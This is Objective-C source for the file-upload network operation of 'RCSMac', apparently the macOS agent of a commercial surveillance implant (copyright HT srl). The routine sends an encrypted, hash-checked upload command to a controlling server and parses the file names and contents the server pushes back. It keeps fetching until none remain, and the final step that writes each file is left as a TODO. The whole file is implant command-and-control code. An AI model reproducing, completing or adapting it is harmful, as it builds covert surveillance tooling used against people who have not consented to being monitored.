/*
 * RCSMac - Upload File Network Operation
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "UploadNetworkOperation.h"
#import "NSMutableData+AES128.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSData+Pascal.h"
#import "RCSMCommon.h"

//#define DEBUG_UP_NOP


@implementation UploadNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport = aTransport;
      mUploads = [[NSMutableArray alloc] init];
    
#ifdef DEBUG_UP_NOP
      infoLog(ME, @"mTransport: %@", mTransport);
#endif
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [mUploads release];
  [super dealloc];
}

- (BOOL)perform
{
#ifdef DEBUG_UP_NOP
  infoLog(ME, @"");
#endif
  
  uint32_t command              = PROTO_UPLOAD;
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                length: sizeof(uint32_t)];
  NSData *commandSha            = [commandData sha1Hash];
  
  [commandData appendData: commandSha];
  
#ifdef DEBUG_UP_NOP
  infoLog(ME, @"commandData: %@", commandData);
#endif
  
  [commandData encryptWithKey: gSessionKey];
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];
  
#ifdef DEBUG_UP_NOP
  infoLog(ME, @"replyDecrypted: %@", replyDecrypted);
#endif
  
  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // remove padding
  [replyDecrypted removePadding];
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_UP_NOP
      errorLog(ME, @"exception on sha makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];
  
#ifdef DEBUG_UP_NOP
  infoLog(ME, @"shaRemote: %@", shaRemote);
  infoLog(ME, @"shaLocal : %@", shaLocal);
#endif
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {
#ifdef DEBUG_UP_NOP
      errorLog(ME, @"sha mismatch");
#endif
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
    
      return NO;
    }
  
  if (command != PROTO_OK)
    {
#ifdef DEBUG_UP_NOP
      errorLog(ME, @"No upload request available (command %d)", command);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  uint32_t packetSize     = 0;
  uint32_t numOfFilesLeft = 0;
  uint32_t filenameSize   = 0;
  uint32_t fileSize       = 0;
  
  @try
    {
      [replyDecrypted getBytes: &packetSize
                         range: NSMakeRange(4, sizeof(uint32_t))];
      [replyDecrypted getBytes: &numOfFilesLeft
                         range: NSMakeRange(8, sizeof(uint32_t))];
      [replyDecrypted getBytes: &filenameSize
                         range: NSMakeRange(12, sizeof(uint32_t))];
      [replyDecrypted getBytes: &fileSize
                         range: NSMakeRange(16 + filenameSize, sizeof(uint32_t))];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_UP_NOP
      errorLog(ME, @"exception on parameters makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
#ifdef DEBUG_UP_NOP
  infoLog(ME, @"packetSize    : %d", packetSize);
  infoLog(ME, @"numOfFilesLeft: %d", numOfFilesLeft);
  infoLog(ME, @"filenameSize  : %d", filenameSize);
  infoLog(ME, @"fileSize      : %d", fileSize);
#endif
  
  NSData *stringData;
  NSData *fileContent;
  
  @try
    {
      stringData  = [[NSData alloc] initWithData:
                     [replyDecrypted subdataWithRange: NSMakeRange(12, filenameSize + 4)]];
      fileContent = [[NSData alloc] initWithData:
                     [replyDecrypted subdataWithRange: NSMakeRange(16 + filenameSize + 4, fileSize)]];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_UP_NOP
      errorLog(ME, @"exception on stringData makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  NSString *filename  = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
  
  if (filename == nil)
    {
#ifdef DEBUG_UP_NOP
      errorLog(ME, @"filename is empty, error on unpascalize");
#endif
    }
  else
    {
#ifdef DEBUG_UP_NOP
      infoLog(ME, @"filename: %@", filename);
      infoLog(ME, @"file content: %@", fileContent);
#endif
      
      // TODO: Do file upload
    }

  [fileContent release];
  [stringData release];
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  //
  // Get files until there's no one left
  //
  if (numOfFilesLeft != 0)
    {
      return [self perform];
    }
  
  return YES;
}

@end